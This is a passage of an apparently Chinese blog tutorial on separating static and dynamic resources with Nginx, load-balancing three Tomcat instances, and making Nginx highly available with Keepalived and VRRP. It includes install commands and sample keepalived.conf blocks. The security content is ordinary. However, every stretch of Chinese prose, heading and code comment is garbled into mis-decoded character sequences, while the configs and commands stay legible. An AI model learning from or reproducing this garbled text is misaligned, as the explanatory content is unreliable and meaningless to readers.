class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        $(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">           $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;http://192.168.200.133/demo/getAddress&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span><br><span class="language-javascript">               $(<span class="hljs-string">&quot;#msg&quot;</span>).<span class="hljs-title function_">html</span>(data);</span><br><span class="language-javascript">           &#125;);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;images/logo.png&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Nginxå¦‚ä½•å°†è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;images/mv.png&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>4.é…ç½®Nginxçš„é™æ€èµ„æºä¸åŠ¨æ€èµ„æºçš„è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs conf">upstream webservice&#123;<br>   server 192.168.200.146:8080;<br>&#125;<br>server &#123;<br>        listen       80;<br>        server_name  localhost;<br><br>        #åŠ¨æ€èµ„æº<br>        location /demo &#123;<br>                proxy_pass http://webservice;<br>        &#125;<br>        #é™æ€èµ„æº<br>        location ~/.*\.(png|jpg|gif|js)&#123;<br>                root html/web;<br>                gzip on;<br>        &#125;<br><br>        location / &#123;<br>            root   html/web;<br>            index  index.html index.htm;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>5.å¯åŠ¨æµ‹è¯•ï¼Œè®¿é—®http://192.168.200.133/index.html</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494128097.png" alt="1604494128097" /></p><p>å‡å¦‚æŸä¸ªæ—¶é—´ç‚¹ï¼Œç”±äºæŸä¸ªåŸå› å¯¼è‡´Tomcatåçš„æœåŠ¡å™¨å®•æœºäº†ï¼Œæˆ‘ä»¬å†æ¬¡è®¿é—®Nginx,ä¼šå¾—åˆ°å¦‚ä¸‹æ•ˆæœï¼Œç”¨æˆ·è¿˜æ˜¯èƒ½çœ‹åˆ°é¡µé¢ï¼Œåªæ˜¯ç¼ºå¤±äº†è®¿é—®æ¬¡æ•°çš„ç»Ÿè®¡ï¼Œè¿™å°±æ˜¯å‰åç«¯è€¦åˆåº¦é™ä½çš„æ•ˆæœï¼Œå¹¶ä¸”æ•´ä¸ªè¯·æ±‚åªå’Œåçš„æœåŠ¡å™¨äº¤äº’äº†ä¸€æ¬¡ï¼Œjså’Œimageséƒ½ç›´æ¥ä»Nginxè¿”å›ï¼Œæä¾›äº†æ•ˆç‡ï¼Œé™ä½äº†åçš„æœåŠ¡å™¨çš„å‹åŠ›ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494156197.png" alt="1604494156197" /></p><h2 id="nginxå®ç°tomcaté›†ç¾¤æ­å»º"><a class="markdownIt-Anchor" href="#nginxå®ç°tomcaté›†ç¾¤æ­å»º"></a> Nginxå®ç°Tomcaté›†ç¾¤æ­å»º</h2><p>åœ¨ä½¿ç”¨Nginxå’ŒTomcatéƒ¨ç½²é¡¹ç›®çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ä¸€å°NginxæœåŠ¡å™¨å’Œä¸€å°TomcatæœåŠ¡å™¨ï¼Œæ•ˆæœå›¾å¦‚ä¸‹:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494256017.png" alt="1604494256017" /></p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æœTomcatçš„çœŸçš„å®•æœºäº†ï¼Œæ•´ä¸ªç³»ç»Ÿå°±ä¼šä¸å®Œæ•´ï¼Œæ‰€ä»¥å¦‚ä½•è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œä¸€å°æœåŠ¡å™¨å®¹æ˜“å®•æœºï¼Œé‚£å°±å¤šæ­å»ºå‡ å°TomcatæœåŠ¡å™¨ï¼Œè¿™æ ·çš„è¯å°±æå‡äº†åçš„æœåŠ¡å™¨çš„å¯ç”¨æ€§ã€‚è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„é›†ç¾¤ï¼Œæ­å»ºTomcatçš„é›†ç¾¤éœ€è¦ç”¨åˆ°äº†Nginxçš„åå‘ä»£ç†å’Œèµ‹å€¼å‡è¡¡çš„çŸ¥è¯†ï¼Œå…·ä½“å¦‚ä½•æ¥å®ç°?æˆ‘ä»¬å…ˆæ¥åˆ†æä¸‹åŸç†</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494269848.png" alt="1604494269848" /></p><p>ç¯å¢ƒå‡†å¤‡ï¼š</p><p>(1)å‡†å¤‡3å°tomcat,ä½¿ç”¨ç«¯å£è¿›è¡ŒåŒºåˆ†[å®é™…ç¯å¢ƒåº”è¯¥æ˜¯ä¸‰å°æœåŠ¡å™¨]ï¼Œ<a href="http://xn--server-2g0js76l.ml">ä¿®æ”¹server.ml</a>ï¼Œå°†ç«¯å£ä¿®æ”¹åˆ†åˆ«ä¿®æ”¹ä¸º8080,8180,8280</p><p>(2)å¯åŠ¨tomcatå¹¶è®¿é—®æµ‹è¯•ï¼Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494822961.png" alt="1604494822961" /></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8180</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494843886.png" alt="1604494843886" /></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8280</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494860954.png" alt="1604494860954" /></p><p>(3)åœ¨Nginxå¯¹åº”çš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> webservice&#123;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.146:8080</span>;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.146:8180</span>;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.146:8280</span>;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>å¥½äº†ï¼Œå®Œæˆäº†ä¸Šè¿°ç¯å¢ƒçš„éƒ¨ç½²ï¼Œæˆ‘ä»¬å·²ç»è§£å†³äº†Tomcatçš„é«˜å¯ç”¨æ€§ï¼Œä¸€å°æœåŠ¡å™¨å®•æœºï¼Œè¿˜æœ‰å…¶ä»–ä¸¤æ¡å¯¹å¤–æä¾›æœåŠ¡ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å®ç°åå°æœåŠ¡å™¨çš„ä¸é—´æ–­æ›´æ–°ã€‚ä½†æ˜¯æ–°é—®é¢˜å‡ºç°äº†ï¼Œä¸Šè¿°ç¯å¢ƒä¸­ï¼Œå¦‚æœæ˜¯Nginxå®•æœºäº†å‘¢ï¼Œé‚£ä¹ˆæ•´å¥—ç³»ç»Ÿéƒ½å°†æœåŠ¡å¯¹å¤–æä¾›æœåŠ¡äº†ï¼Œè¿™ä¸ªå¦‚ä½•è§£å†³ï¼Ÿ</p><h2 id="nginxé«˜å¯ç”¨è§£å†³æ–¹æ¡ˆ"><a class="markdownIt-Anchor" href="#nginxé«˜å¯ç”¨è§£å†³æ–¹æ¡ˆ"></a> Nginxé«˜å¯ç”¨è§£å†³æ–¹æ¡ˆ</h2><p>é’ˆå¯¹äºä¸Šé¢æåˆ°çš„é—®é¢˜ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸‹è¦æƒ³è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œéœ€è¦é¢ä¸´å“ªäº›é—®é¢˜?</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604495169905.png" alt="1604495169905" /></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">éœ€è¦ä¸¤å°ä»¥ä¸Šçš„NginxæœåŠ¡å™¨å¯¹å¤–æä¾›æœåŠ¡ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥è§£å†³å…¶ä¸­ä¸€å°å®•æœºäº†ï¼Œå¦å¤–ä¸€å°è¿˜èƒ½å¯¹å¤–æä¾›æœåŠ¡ï¼Œä½†æ˜¯å¦‚æœæ˜¯ä¸¤å°NginxæœåŠ¡å™¨çš„è¯ï¼Œä¼šæœ‰ä¸¤ä¸ª<span class="hljs-built_in">IP</span>åœ°å€ï¼Œç”¨æˆ·è¯¥è®¿é—®å“ªå°æœåŠ¡å™¨ï¼Œç”¨æˆ·æ€ä¹ˆçŸ¥é“å“ªå°æ˜¯å¥½çš„ï¼Œå“ªå°æ˜¯å®•æœºäº†çš„?<br></code></pre></td></tr></table></figure><h3 id="keepalived"><a class="markdownIt-Anchor" href="#keepalived"></a> Keepalived</h3><p>ä½¿ç”¨Keepalivedæ¥è§£å†³ï¼ŒKeepalived è½¯ä»¶ç”± C ç¼–å†™çš„ï¼Œæœ€åˆæ˜¯ä¸“ä¸º LVS è´Ÿè½½å‡è¡¡è½¯ä»¶è®¾è®¡çš„ï¼ŒKeepalived è½¯ä»¶ä¸»è¦æ˜¯é€šè¿‡ VRRP åè®®å®ç°é«˜å¯ç”¨åŠŸèƒ½ã€‚</p><h3 id="vrrpä»‹ç»"><a class="markdownIt-Anchor" href="#vrrpä»‹ç»"></a> VRRPä»‹ç»</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604495824757.png" alt="1604495824757" /></p><p>VRRPï¼ˆVirtual Route Redundancy Protocolï¼‰åè®®ï¼Œç¿»è¯‘è¿‡æ¥ä¸ºè™šæ‹Ÿè·¯ç”±å†—ä½™åè®®ã€‚VRRPåè®®å°†ä¸¤å°æˆ–å¤šå°è·¯ç”±å™¨è®¾å¤‡è™šæ‹Ÿæˆä¸€ä¸ªè®¾å¤‡ï¼Œå¯¹å¤–æä¾›è™šæ‹Ÿè·¯ç”±å™¨IP,è€Œåœ¨è·¯ç”±å™¨ç»„å†…éƒ¨ï¼Œå¦‚æœå®é™…æ‹¥æœ‰è¿™ä¸ªå¯¹å¤–IPçš„è·¯ç”±å™¨å¦‚æœå·¥ä½œæ­£å¸¸çš„è¯å°±æ˜¯MASTER,MASTERå®ç°é’ˆå¯¹è™šæ‹Ÿè·¯ç”±å™¨IPçš„å„ç§ç½‘ç»œåŠŸèƒ½ã€‚å…¶ä»–è®¾å¤‡ä¸æ‹¥æœ‰è¯¥è™šæ‹ŸIPï¼ŒçŠ¶æ€ä¸ºBACKUP,å¤„äº†æ¥æ”¶MASTERçš„VRRPçŠ¶æ€é€šå‘Šä¿¡æ¯ä»¥å¤–ï¼Œä¸æ‰§è¡Œå¯¹å¤–çš„ç½‘ç»œåŠŸèƒ½ã€‚å½“ä¸»æœºå¤±æ•ˆæ—¶ï¼ŒBACKUPå°†æ¥ç®¡åŸå…ˆMASTERçš„ç½‘ç»œåŠŸèƒ½ã€‚</p><p>ä»ä¸Šé¢çš„ä»‹ç»ä¿¡æ¯è·å–åˆ°çš„å†…å®¹å°±æ˜¯VRRPæ˜¯ä¸€ç§åè®®ï¼Œé‚£è¿™ä¸ªåè®®æ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„ï¼Ÿ</p><p>1.é€‰æ‹©åè®®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">VRRP</span>å¯ä»¥æŠŠä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨çš„è´£ä»»åŠ¨æ€åˆ†é…åˆ°å±€åŸŸç½‘ä¸Šçš„ VRRP è·¯ç”±å™¨ä¸­çš„ä¸€å°ã€‚å…¶ä¸­çš„è™šæ‹Ÿè·¯ç”±å³Virtualè·¯ç”±æ˜¯ç”±VRRPè·¯ç”±ç¾¤ç»„åˆ›å»ºçš„ä¸€ä¸ªä¸çœŸå®å­˜åœ¨çš„è·¯ç”±ï¼Œè¿™ä¸ªè™šæ‹Ÿè·¯ç”±ä¹Ÿæ˜¯æœ‰å¯¹åº”çš„IPåœ°å€ã€‚è€Œä¸”VRRPè·¯ç”±<span class="hljs-number">1</span>å’ŒVRRPè·¯ç”±<span class="hljs-number">2</span>ä¹‹é—´ä¼šæœ‰ç«äº‰é€‰æ‹©ï¼Œé€šè¿‡é€‰æ‹©ä¼šäº§ç”Ÿä¸€ä¸ªMasterè·¯ç”±å’Œä¸€ä¸ªBackupè·¯ç”±ã€‚<br></code></pre></td></tr></table></figure><p>2.è·¯ç”±å®¹é”™åè®®</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-literal">Master</span>è·¯ç”±å’ŒBackupè·¯ç”±ä¹‹é—´ä¼šæœ‰ä¸€ä¸ªå¿ƒè·³æ£€æµ‹ï¼Œ<span class="hljs-literal">Master</span>ä¼šå®šæ—¶å‘ŠçŸ¥Backupè‡ªå·±çš„çŠ¶æ€ï¼Œå¦‚æœåœ¨æŒ‡å®šçš„æ—¶é—´å†…ï¼ŒBackupæ²¡æœ‰æ¥æ”¶åˆ°è¿™ä¸ªé€šçŸ¥å†…å®¹ï¼ŒBackupå°±ä¼šæ›¿ä»£<span class="hljs-literal">Master</span>æˆä¸ºæ–°çš„<span class="hljs-literal">Master</span>ã€‚<span class="hljs-literal">Master</span>è·¯ç”±æœ‰ä¸€ä¸ªç‰¹æƒå°±æ˜¯è™šæ‹Ÿè·¯ç”±å’Œåç«¯æœåŠ¡å™¨éƒ½æ˜¯é€šè¿‡<span class="hljs-literal">Master</span>è¿›è¡Œæ•°æ®ä¼ é€’äº¤äº’çš„ï¼Œè€Œå¤‡ä»½èŠ‚ç‚¹åˆ™ä¼šç›´æ¥ä¸¢å¼ƒè¿™äº›è¯·æ±‚å’Œæ•°æ®ï¼Œä¸åšå¤„ç†ï¼Œåªæ˜¯å»ç›‘å¬<span class="hljs-literal">Master</span>çš„çŠ¶æ€<br></code></pre></td></tr></table></figure><p>ç”¨äº†Keepalivedåï¼Œè§£å†³æ–¹æ¡ˆå¦‚ä¸‹:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604495442179.png" alt="1604495442179" /></p><h3 id="ç¯å¢ƒæ­å»º"><a class="markdownIt-Anchor" href="#ç¯å¢ƒæ­å»º"></a> ç¯å¢ƒæ­å»º</h3><p>ç¯å¢ƒå‡†å¤‡</p><table><thead><tr><th>VIP</th><th>IP</th><th>ä¸»æœºå</th><th>ä¸»/ä»</th></tr></thead><tbody><tr><td></td><td>192.168.200.133</td><td>keepalived1</td><td>Master</td></tr><tr><td>192.168.200.222</td><td></td><td></td><td></td></tr><tr><td></td><td>192.168.200.122</td><td>keepalived2</td><td>Backup</td></tr></tbody></table><p>keepalivedçš„å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ­¥éª¤1:ä»å®˜æ–¹ç½‘ç«™ä¸‹è½½keepalived,å®˜ç½‘åœ°å€https://keepalived.org/<br>æ­¥éª¤2:å°†ä¸‹è½½çš„èµ„æºä¸Šä¼ åˆ°æœåŠ¡å™¨<br>keepalived-2.0.20.tar.gz<br>æ­¥éª¤3:åˆ›å»ºkeepalivedç›®å½•ï¼Œæ–¹ä¾¿ç®¡ç†èµ„æº<br><span class="hljs-built_in">mkdir</span> keepalived<br>æ­¥éª¤4:å°†å‹ç¼©æ–‡ä»¶è¿›è¡Œè§£å‹ç¼©ï¼Œè§£å‹ç¼©åˆ°æŒ‡å®šçš„ç›®å½•<br>tar -zxf keepalived-2.0.20.tar.gz -C keepalived/<br>æ­¥éª¤5:å¯¹keepalivedè¿›è¡Œé…ç½®ï¼Œç¼–è¯‘å’Œå®‰è£…<br><span class="hljs-built_in">cd</span> keepalived/keepalived-2.0.20<br>./configure --sysconf=/etc --prefix=/usr/local<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåï¼Œæœ‰ä¸¤ä¸ªæ–‡ä»¶éœ€è¦æˆ‘ä»¬è®¤è¯†ä¸‹ï¼Œä¸€ä¸ªæ˜¯ <code>/etc/keepalived/keepalived.conf</code>(keepalivedçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸»è¦æ“ä½œçš„å°±æ˜¯è¯¥æ–‡ä»¶)ï¼Œä¸€ä¸ªæ˜¯/usr/local/sbinç›®å½•ä¸‹çš„<code>keepalived</code>,æ˜¯ç³»ç»Ÿé…ç½®è„šæœ¬ï¼Œç”¨æ¥å¯åŠ¨å’Œå…³é—­keepalived</p><h3 id="keepalivedé…ç½®æ–‡ä»¶ä»‹ç»"><a class="markdownIt-Anchor" href="#keepalivedé…ç½®æ–‡ä»¶ä»‹ç»"></a> Keepalivedé…ç½®æ–‡ä»¶ä»‹ç»</h3><p>æ‰“å¼€keepalived.confé…ç½®æ–‡ä»¶</p><p>è¿™é‡Œé¢ä¼šåˆ†ä¸‰éƒ¨ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯globalå…¨å±€é…ç½®ã€ç¬¬äºŒéƒ¨åˆ†æ˜¯vrrpç›¸å…³é…ç½®ã€ç¬¬ä¸‰éƒ¨åˆ†æ˜¯LVSç›¸å…³é…ç½®ã€‚<br />æœ¬æ¬¡è¯¾ç¨‹ä¸»è¦æ˜¯ä½¿ç”¨keepalivedå®ç°é«˜å¯ç”¨éƒ¨ç½²ï¼Œæ²¡æœ‰ç”¨åˆ°LVSï¼Œæ‰€ä»¥æˆ‘ä»¬é‡ç‚¹å…³æ³¨çš„æ˜¯å‰ä¸¤éƒ¨åˆ†</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">global</span>å…¨å±€éƒ¨åˆ†ï¼š<br>global_defs &#123;<br>   <span class="hljs-meta">#é€šçŸ¥é‚®ä»¶ï¼Œå½“keepalivedå‘é€åˆ‡æ¢æ—¶éœ€è¦å‘emailç»™å…·ä½“çš„é‚®ç®±åœ°å€</span><br>   notification_email &#123;<br>     tom<span class="hljs-symbol">@itcast</span>.cn<br>     jerry<span class="hljs-symbol">@itcast</span>.cn<br>   &#125;<br>   <span class="hljs-meta">#è®¾ç½®å‘ä»¶äººçš„é‚®ç®±ä¿¡æ¯</span><br>   notification_email_from zhaomin<span class="hljs-symbol">@itcast</span>.cn<br>   <span class="hljs-meta">#æŒ‡å®šsmptæœåŠ¡åœ°å€</span><br>   smtp_server <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.1</span><br>   <span class="hljs-meta">#æŒ‡å®šsmptæœåŠ¡è¿æ¥è¶…æ—¶æ—¶é—´</span><br>   smtp_connect_timeout <span class="hljs-number">30</span><br>   <span class="hljs-meta">#è¿è¡ŒkeepalivedæœåŠ¡å™¨çš„ä¸€ä¸ªæ ‡è¯†ï¼Œå¯ä»¥ç”¨ä½œå‘é€é‚®ä»¶çš„ä¸»é¢˜ä¿¡æ¯</span><br>   router_id LVS_DEVEL<br>   <br>   <span class="hljs-meta">#é»˜è®¤æ˜¯ä¸è·³è¿‡æ£€æŸ¥ã€‚æ£€æŸ¥æ”¶åˆ°çš„VRRPé€šå‘Šä¸­çš„æ‰€æœ‰åœ°å€å¯èƒ½ä¼šæ¯”è¾ƒè€—æ—¶ï¼Œè®¾ç½®æ­¤å‘½ä»¤çš„æ„æ€æ˜¯ï¼Œå¦‚æœé€šå‘Šä¸æ¥æ”¶çš„ä¸Šä¸€ä¸ªé€šå‘Šæ¥è‡ªç›¸åŒçš„masterè·¯ç”±å™¨ï¼Œåˆ™ä¸æ‰§è¡Œæ£€æŸ¥(è·³è¿‡æ£€æŸ¥)</span><br>   vrrp_skip_check_adv_addr<br>   <span class="hljs-meta">#ä¸¥æ ¼éµå®ˆVRRPåè®®ã€‚</span><br>   vrrp_strict<br>   <span class="hljs-meta">#åœ¨ä¸€ä¸ªæ¥å£å‘é€çš„ä¸¤ä¸ªå…è´¹ARPä¹‹é—´çš„å»¶è¿Ÿã€‚å¯ä»¥ç²¾ç¡®åˆ°æ¯«ç§’çº§ã€‚é»˜è®¤æ˜¯0</span><br>   vrrp_garp_interval <span class="hljs-number">0</span><br>   <span class="hljs-meta">#åœ¨ä¸€ä¸ªç½‘å¡ä¸Šæ¯ç»„naæ¶ˆæ¯ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œé»˜è®¤ä¸º0</span><br>   vrrp_gna_interval <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pf">VRRPéƒ¨åˆ†ï¼Œè¯¥éƒ¨åˆ†å¯ä»¥åŒ…å«ä»¥ä¸‹å››ä¸ªå­æ¨¡å—<br><span class="hljs-number">1</span>. vrrp_script<br><span class="hljs-number">2</span>. vrrp_sync_group<br><span class="hljs-number">3</span>. garp_group<br><span class="hljs-number">4</span>. vrrp_instance<br>æˆ‘ä»¬ä¼šç”¨åˆ°ç¬¬ä¸€ä¸ªå’Œç¬¬å››ä¸ªï¼Œ<br><span class="hljs-comment">#è®¾ç½®keepalivedå®ä¾‹çš„ç›¸å…³ä¿¡æ¯ï¼ŒVI_1ä¸ºVRRPå®ä¾‹åç§°</span><br>vrrp_instance VI_1 &#123;<br>    <span class="hljs-keyword">state</span> MASTER  <span class="hljs-comment">#æœ‰ä¸¤ä¸ªå€¼å¯é€‰MASTERä¸» BACKUPå¤‡</span><br>    interface ens33<span class="hljs-comment">#vrrpå®ä¾‹ç»‘å®šçš„æ¥å£ï¼Œç”¨äºå‘é€VRRPåŒ…[å½“å‰æœåŠ¡å™¨ä½¿ç”¨çš„ç½‘å¡åç§°]</span><br>    virtual_router_id <span class="hljs-number">51</span><span class="hljs-comment">#æŒ‡å®šVRRPå®ä¾‹IDï¼ŒèŒƒå›´æ˜¯0-255</span><br>    priority <span class="hljs-number">100</span><span class="hljs-comment">#æŒ‡å®šä¼˜å…ˆçº§ï¼Œä¼˜å…ˆçº§é«˜çš„å°†æˆä¸ºMASTER</span><br>    advert_int <span class="hljs-number">1</span><span class="hljs-comment">#æŒ‡å®šå‘é€VRRPé€šå‘Šçš„é—´éš”ï¼Œå•ä½æ˜¯ç§’</span><br>    authentication &#123;<span class="hljs-comment">#vrrpä¹‹é—´é€šä¿¡çš„è®¤è¯ä¿¡æ¯</span><br>        auth_type PASS<span class="hljs-comment">#æŒ‡å®šè®¤è¯æ–¹å¼ã€‚PASSç®€å•å¯†ç è®¤è¯(æ¨è)</span><br>        auth_pass <span class="hljs-number">1111</span><span class="hljs-comment">#æŒ‡å®šè®¤è¯ä½¿ç”¨çš„å¯†ç ï¼Œæœ€å¤š8ä½</span><br>    &#125;<br>    virtual_ipaddress &#123; <span class="hljs-comment">#è™šæ‹ŸIPåœ°å€è®¾ç½®è™šæ‹ŸIPåœ°å€ï¼Œä¾›ç”¨æˆ·è®¿é—®ä½¿ç”¨ï¼Œå¯è®¾ç½®å¤šä¸ªï¼Œä¸€è¡Œä¸€ä¸ª</span><br>        <span class="hljs-number">192.168</span>.<span class="hljs-number">200.222</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½®å†…å®¹å¦‚ä¸‹:</p><p>æœåŠ¡å™¨1</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">global_defs &#123;<br>   notification_email &#123;<br>        <span class="hljs-symbol">tom@</span>itcast.cn<br>        <span class="hljs-symbol">jerry@</span>itcast.cn<br>   &#125;<br>   notification_email_from <span class="hljs-symbol">zhaomin@</span>itcast.cn<br>   smtp_server <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.1</span><br>   